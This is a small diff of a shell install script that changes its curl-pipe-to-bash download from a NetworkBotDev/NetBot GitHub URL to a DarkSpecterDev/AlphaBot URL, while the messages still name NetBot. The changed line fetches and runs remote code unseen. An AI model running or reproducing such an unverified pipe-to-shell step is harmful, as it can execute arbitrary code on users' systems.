@@ -9,7 +9,7 @@ echo ""
 echo "Downloading NetBot installation script..."
 
 # Download and run the main installation script
-curl -s https://raw.githubusercontent.com/NetworkBotDev/NetBot/main/netbot.sh | bash
+curl -s https://raw.githubusercontent.com/DarkSpecterDev/AlphaBot/main/netbot.sh | bash
 
 echo ""
 echo "Installation completed!"
